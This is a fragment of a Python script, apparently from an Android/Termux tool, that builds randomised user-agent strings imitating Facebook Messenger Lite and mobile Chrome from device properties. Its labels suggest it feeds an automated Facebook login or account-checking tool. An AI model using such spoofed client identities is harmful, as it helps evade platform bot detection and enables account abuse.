	try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
	except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","") 
	ugent = f"Davik/2.1.0 (Linux; U; Android {versi_android}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{versi_android};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
	return ugent

# // UserAgent Async Validate //
def useragent_biasa():
	versi_android = str(random.randint(4,12))
	versi_chrome = str(random.randint(85,105))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,150))
	model_device = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
	build_device = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
	ugent = f"Mozilla/5.0 (Linux; Android {versi_android}; {str(model_device)} Build/{str(build_device)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi_chrome} Mobile Safari/537.36"
	return ugent

# // UserAgent Messenger //
def useragent_messenger():
	versi_chrome = str(random.randint(85,105))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,150))
	ugent = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi_chrome} Safari/537.36"
	return ugent
	
if __name__=="__main__":
	menu()